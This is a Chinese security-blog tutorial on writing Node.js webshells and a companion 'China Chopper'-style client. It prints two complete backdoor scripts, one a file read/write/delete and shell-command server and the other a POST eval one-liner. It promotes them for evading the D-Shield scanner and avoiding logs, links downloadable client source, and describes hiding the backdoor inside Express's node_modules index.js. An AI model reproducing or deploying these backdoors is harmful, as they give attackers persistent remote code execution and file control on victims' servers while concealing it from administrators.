## ****0x00 前言****

“webshell”
这个关键字在黑与白的术语中经常出现，它具有操作目标web站点的文件权限，而webshell在web查杀中是脆弱的，管理者可以通过web日志进行溯源，从而查杀webshell。在web杀软中，webshell脚本不够健壮会直接被BAN掉。

“如何绕过XX狗”，“如何才能更加隐蔽”，“webshell流量加密”等问题也在安全圈中也是老生常谈的问题。而一句话木马慢慢流行起来，它非常简短，只需要中国菜刀等管理webshell的工具进行配合即可管理服务器文件。

那么本篇文章给大家介绍一种新的web应用后门，它是“nodeJS”，我们从简单了解nodeJs到nodeJs版中国菜刀脚本编写。

## ****0x01 nodeJS的简单概述****

NodeJS是一种后端语言，由C++编写而成，它的语法结构遵循了前端JavaScript语法。

nodeJs不需要web容器，nodeJs自己就是web容器。

我们看下面例子：

![](https://image.3001.net/images/20200813/1597316297.png!small)

可能这张图片理解起来不是太清楚，那么我们简单编写一段处理GET请求的代码。

![](https://image.3001.net/images/20200813/1597316317.png!small)

我们使用最喜欢的BurpSuite工具来进行测试

![](https://image.3001.net/images/20200813/1597316341.png!small)

Post请求案例：

![](https://image.3001.net/images/20200813/1597316357.png!small)

可以简单的了解到，nodeJS没有web容器。我们从刚刚的代码中所了解到，nodeJS的一系列操作都是使用require()来进行引包，随后在引进来的资源上进行操作。同时nodeJS是没有像PHP/ASP语言中的
<?php/<% 文件头的，上来直接编写nodeJS语句即可。

## ****0x02 nodeJS后门了解****

因为没有语言标识符(PHP中的<?php)，所以它很难被传统的WEB查杀工具所扫描到，笔者使用”D盾”来进行测试笔者编写的nodeJS小马。

![](https://image.3001.net/images/20200813/1597316375.png!small)

这个小马如何使用，笔者就不分享了，它利用起来不方便先不说，其次下面有一种姿势来代替它。

小马脚本：

> let http = require('http');
>
> let url = require('url');
>
> let fs = require('fs');
>
> let cmd = require('child_process');
>
> let moduleName = ['readfile','writefile','cmd','readdir','unlink'];
>
> let server = http.createServer((request, response)=>{
>
> let urlObj = url.parse(request.url,true).query;
>
> if(!urlObj.type || !moduleName.includes(urlObj.type)){
>
> response.writeHead(404, {'Content-Type':'text/html;'});
>
> }else{
>
> response.writeHead(200, {'Content-Type':'text/css;'});
>
> }
>
> var result = '';
>
> if(!urlObj.path){
>
> urlObj.path = './';
>
> }
>
> switch(urlObj.type){
>
> case 'readfile':
>
> try {
>
> result = fs.readFileSync(urlObj.path).toString();
>
> }catch(e){
>
> result = '请检查path参数，文件读取失败！';
>
> }
>
> break;
>
> case 'unlink':
>
> try {
>
> fs.unlinkSync(urlObj.path);
>
> result = '文件删除成功';
>
> }catch(e){
>
> result = 'unlink模块需要path参数，文件删除失败';
>
> }
>
> break;
>
> case 'writefile':
>
> if(urlObj.value){
>
> try {
>
> fs.writeFileSync(urlObj.path, urlObj.value);
>
> result = '文件写入成功~';
>
> }catch(e){
>
> result = '文件写入失败';
>
> }
>
> }else{
>
> result = 'writefile模块需要传递path(写入路径)与value(写入内容)参数~';
>
> }
>
> break;
>
> case 'readdir':
>
> try{
>
> let fileArr = fs.readdirSync(urlObj.path);
>
> let tmpStr = '';
>
> let Dirs = [];
>
> let Files = [];
>
> for(let i in fileArr){
>
> try{
>
> flag = fs.lstatSync(urlObj.path + '\\\' + fileArr[i]).isFile();
>
> if(flag){
>
> Files.push(fileArr[i]);
>
> }else{
>
> Dirs.push(fileArr[i]);
>
> }
>
> }catch(e){}
>
> }
>
> tmpStr += `\r\n\r\n\r\n-----------↓↓↓目录↓↓↓-----------\r\n`;
>
> for(let i in Dirs){
>
> tmpStr += Dirs[i] + "\r\n";
>
> }
>
> tmpStr += `\r\n\r\n\r\n-----------↓↓↓文件↓↓↓-----------\r\n`;
>
> for(let i in Files){
>
> tmpStr += Files[i] + "\r\n";
>
> }
>
> result =
> `当前执行程序的路径${process.cwd()}\r\n代码存放的位置${__dirname}\r\nnodeJs文件路径${process.execPath}\r\n${tmpStr}`;
>
> }catch(e){
>
> result = '读取目录失败';
>
> }
>
> break;
>
> case 'cmd':
>
> if(urlObj.cmd){
>
> try{
>
> result = cmd.execSync(urlObj.cmd);
>
> }catch(e){
>
> result = 'cmd命令错误';
>
> }
>
> }else{
>
> result = 'cmd模块需要传递cmd参数~';
>
> }
>
> break;
>
> }
>
> response.write(result);
>
> response.end();
>
> });
>
> server.listen(5555);

这里笔者推荐使用nodeJsWebshell。

> 第一点：因为没有语言标识符，D盾根本无法识别出该文件是后门。
>
> 第二点：在运维人士中，了解nodeJS的也不是太多。但是放在前端人员身上，nodeJS是学习路线中必学的。但前端管理范围大家都懂。
>
> 第三点：由于nodeJS服务本来就属于安全的WEB服务，这一点杀软会原谅nodeJS。
>
> 第四点：因为nodeJS自己就是自己的WEB容器，所以nodeJS并没有积极地去提供nodeJS
> WEB访问日志。（但nodeJS日志是可以通过代码层来实现）

缺点就是它只适合进行后期的权限维持，如刚才笔者必须运行node XXXX.js才可以开启nodeJS服务。

通过这一系列因素，笔者有了一种打造nodeJS中国菜刀的念头。

## ****0x03 编写菜刀思路****

nodeJs传承了JavaScript的语法，开启了后端语言，我们知道前台的JavaScript中，eval()函数是用来执行代码的，说到这里我们会想到PHP中的eval也会被黑客当作后门来使用，那么nodeJs存在eval，为什么没有人去造一款管理nodeJs后门的菜刀呢？既然网上没有第一个案例，那笔者就来造出第一个案例吧。下边是笔者对菜刀的理解思维图：

![](https://image.3001.net/images/20200813/1597316471.png!small)

那么传统的一句话木马如PHP一句话木马一样，只需要简单的一句话就可以
eval($_POST[x]);，但是nodeJS却无法这么简短，因为它解析GET/POST请求就需要一堆代码。

在编写nodeJs菜刀之前笔者有一种猜想，是不是nodeJS的eval函数中无法引入包？也就是require函数的执行。

那么笔者进行测试：

![](https://image.3001.net/images/20200813/1597316492.gif)

可以惊讶的看到fs包被成功引入进来了，那么编写中国菜刀的理想也就又近了一步。

## ****0x04 菜刀编写****

笔者在这里写了一段处理POST请求的代码，并且进入eval函数，来达到市场上正常的一句话的效果。代码如下：

![](https://image.3001.net/images/20200813/1597316550.png!small)

这里nodeJS奇怪就奇怪在处理POST请求使用了nodeJS自己封装的addListener事件方法，上图的一系列代码就是在表示
eval($_POST[‘heihu’])，这样的“一句话”还真是“一句话”...

下面使用BurpSuite来测试一下console.log看是否可以成功代码执行。

![](https://image.3001.net/images/20200813/1597316570.png!small)

可以看到console.log()成功被执行。

NodeJS一句话脚本:

> var http = require('http');
>
> var querystring = require('querystring');
>
> var server = http.createServer(function(request, response){
>
> response.writeHead(200, {'Content-Type':'text/html;charset=utf8'});
>
> if(request.method.toLocaleLowerCase() == 'post'){
>
> var string = '';
>
> request.addListener('data', function(chunk){
>
> string += chunk;
>
> });
>
> request.addListener('end', function(){
>
> var strObj = querystring.parse(string);
>
> if(strObj.heihu){
>
> try {
>
> eval(strObj.heihu);
>
> response.end('Eval Ok');
>
> }catch(e){
>
> console.log(e);
>
> response.end('Eval Error');
>
> }
>
> }else{
>
> response.end('Pass Error');
>
> }
>
> });
>
> }else{
>
> response.end();
>
> }
>
> });
>
> server.listen(5555);

那么笔者使用“易语言”来完成这个中国菜刀的小项目吧~（对，你没听错，就是易语言）

首先界面很简单，也就是一个登录窗口。

![](https://image.3001.net/images/20200813/1597316607.png!small)

单击“向着权限进攻~”按钮后

![](https://image.3001.net/images/20200813/1597316633.png!small)

发送POST请求，内容是response.end(‘shellOk’);，如果页面真正返回shellOk后，则代表shell可以成功链接，否则则链接失败。当链接成功时，则进入窗口一，窗口一的界面是这样的：

![](https://image.3001.net/images/20200813/1597316651.png!small)

当载入该窗口则发送一条目录文件遍历的代码至服务端。

![](https://image.3001.net/images/20200813/1597316667.png!small)

完全模拟了我们BurpSuite时的操作。工具只是将一些语句全部封装起来，然后发送。

下边笔者就不再分析源码中每一行的意义了，笔者会将源码共享到这里，大家可以去可以打造一个属于自己的nodeJS后门管理工具。

工具使用案例：

![](https://image.3001.net/images/20200813/1597316688.gif)

百度网盘下载源码：[ _https://pan.baidu.com/s/1GU3FKzP-Gx-gW_ldktdzSg_](https://pan.baidu.com/s/1GU3FKzP-Gx-gW_ldktdzSg) 提取码：6666

## ****0x05 nodeJS后门的隐蔽方式****

我们当然不想单独的去创建一个JS文件，然后去放置后门，这样被查杀的概率也是有的，但笔者这里想到了一种nodeJS后门的隐蔽方式。

Express为nodeJS中应用最广泛的框架，它非常容易就可以去处理nodeJS路由。

我们先看一个express的简单案例：

![](https://image.3001.net/images/20200813/1597316842.png!small)

在使用express框架中，不得不require(‘express’);后再进行操作，在nodeJS中，被require进来的包，虽然只可以接收到exports所暴露出来的变量，但是每行NodeJs语句也会被执行，我们定位到express中核心载入的文件。

在./node_modules/express/index.js文件中我们可以看到正常的处理逻辑：

![](https://image.3001.net/images/20200813/1597316861.png!small)

我们在其中插入我们的后门脚本代码：

![](https://image.3001.net/images/20200813/1597316879.png!small)

这里需要注意的是，这里的listen不要与express框架中的端口相等，否则将会造成端口冲突。

放置后门后整个框架开启了两个端口，分别是5555端口以及6666端口，这两个端口5555端口为express框架的正常服务，而6666端口是我们的后门端口。如图：

![](https://image.3001.net/images/20200813/1597316899.png!small)

